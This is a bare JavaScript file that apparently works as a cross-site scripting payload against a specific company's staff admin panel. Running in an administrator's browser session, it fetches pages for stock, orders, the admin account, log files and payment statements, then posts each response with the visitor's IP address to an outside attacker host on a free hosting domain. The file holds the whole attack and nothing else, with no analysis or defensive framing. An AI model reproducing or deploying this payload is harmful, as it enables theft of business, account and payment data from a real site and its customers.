var script = document.createElement('script');
script.onload = function() {
  //alert("Script loaded and ready");
};
script.src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js";
document.getElementsByTagName('head')[0].appendChild(script);
  function getip(){
	$.getJSON('https://api.ipregistry.co/?key=g4pndt335sensk', function(data) {
	let ips = JSON.stringify(data.ip);
		return ips.replace(/\./g,"");;
	});
  }
  
  function send(page,datas){
  $.getJSON('https://api.ipregistry.co/?key=g4pndt335sensk', function(data) {
		  let ip = JSON.stringify(data.ip).replace(/\"/g,"");
		  var xhttp = new XMLHttpRequest();
		  xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				//console.log(this.responseText);
			}
		  };
		  xhttp.open("POST", "https://thearchic-congress.000webhostapp.com/g.php");
		  xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		  //xhttp.setRequestHeader("X-Requested-With","XMLHttpRequest");
		  xhttp.AllowCredentials=true;
		  xhttp.send("ip="+ip+"-"+page+"&data="+page+encodeURIComponent(datas));
		});
	}

  //stocks
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
		send("STOCKS", this.responseText);
    }
  };
  xhttp.open("GET", "https://crew.offgamers.com/stats_low_stock.php?selected_box=stocks");
  xhttp.AllowCredentials=true;
  xhttp.send();
  
  //orders
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
		send("ORDERS", this.responseText);
    }
  };
  xhttp.open("GET", "https://crew.offgamers.com/order_track.php?selected_box=sales");
  xhttp.AllowCredentials=true;
  xhttp.send();
  
  //account
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
		send("Acount", this.responseText);
    }
  };
  xhttp.open("GET", "https://crew.offgamers.com/admin_account.php");
  xhttp.AllowCredentials=true;
  xhttp.send();
  
  //logs
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
		send("LogFiles", this.responseText);
    }
  };
  xhttp.open("GET", "https://crew.offgamers.com/log_files.php?selected_box=administrator");
  xhttp.AllowCredentials=true;
  xhttp.send();
  
    //payments
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
		send("LogFiles", this.responseText);
    }
  };
  xhttp.open("GET", "https://crew.offgamers.com/account_statement.php?selected_box=payments");
  xhttp.AllowCredentials=true;
  xhttp.send();
